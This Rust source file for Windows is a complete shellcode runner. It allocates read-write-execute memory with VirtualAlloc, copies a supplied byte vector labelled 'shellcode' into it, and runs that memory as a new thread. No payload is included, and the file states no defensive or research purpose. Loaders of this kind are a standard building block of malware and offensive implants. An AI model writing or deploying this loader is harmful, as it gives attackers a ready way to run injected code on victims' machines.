use std::ptr;
use std::slice;
use std::mem;
use std::ffi::c_void;
use windows::Win32::System::Memory;
use windows::Win32::Foundation;
use windows::Win32::Foundation::WIN32_ERROR;
use windows::Win32::System::Threading;
use windows::Win32::System::WindowsProgramming;

pub struct DistributeMemory {
	len: usize,
	ptr: *mut u8,
}

impl Drop for DistributeMemory {
	fn drop(&mut self) {
		unsafe{
			Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
		}
	}
}

impl DistributeMemory {
	fn new(len: usize) -> Result<DistributeMemory, WIN32_ERROR> {
		let mut memory = DistributeMemory {
			len,
			ptr: ptr::null_mut(),
		};
		
		unsafe {
			memory.ptr = Memory::VirtualAlloc(
				ptr::null(),
				//memory address to distribute
				len,
				//memory size
				Memory::MEM_COMMIT | Memory::MEM_RESERVE,
				//alloc type
				Memory::PAGE_EXECUTE_READWRITE,
				//protect attribute
			) as *mut u8;
		};
		
		if memory.ptr.is_null() {
			Err( unsafe{ Foundation::GetLastError()} )
		} else {
			Ok(memory)
		}
	}
	
	pub fn as_slice_mut(&mut self) -> &mut[u8] {
		unsafe { slice::from_raw_parts_mut(self.ptr, self.len) }//turn pointer to mut slice
	}
	
	pub fn as_ptr(&self) -> *mut u8 {
		self.ptr
	}
}

pub struct Thread {
	handle: Foundation::HANDLE,
	tid: u32,
}

impl Drop for Thread {
	fn drop(&mut self) {
		unsafe { Foundation::CloseHandle(self.handle) };
	}
}

impl Thread {
	pub unsafe fn run(start: *const u8) -> Result<Thread, WIN32_ERROR> {
		let mut th = Thread {
			handle: Foundation::HANDLE(0),
			tid: 0,
		};
		
		let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(start) };
		
		th.handle = Threading::CreateThread(
			ptr::null_mut(),
			//thread protect attribute
			0,
			//stack attribute
			Some(ep),
			//pointer to thread func
			ptr::null_mut(),
			//prama to thread func
			windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
			//thread create flags
			&mut th.tid,
			//thread id
		).unwrap();
		
		if th.handle == Foundation::HANDLE(0) {
			Err(Foundation::GetLastError())
		} else {
			Ok(th)
		}
	}
	
	pub fn wait(&self) -> Result<(), WIN32_ERROR> {
		let status = unsafe { Threading::WaitForSingleObject(self.handle, WindowsProgramming::INFINITE) };
		if status == 0 {
			Ok(())
		} else {
			Err( unsafe{Foundation::GetLastError()} )
		}
	}
}

pub fn run(shellcode: Vec<u8>) -> Result<(), WIN32_ERROR> {
	let mut me = DistributeMemory::new(shellcode.len())?;
	let ms = me.as_slice_mut();
	ms[..shellcode.len()].copy_from_slice(shellcode.as_slice());
	let t = unsafe {
		Thread::run(me.as_ptr())
	}?;
	t.wait()
}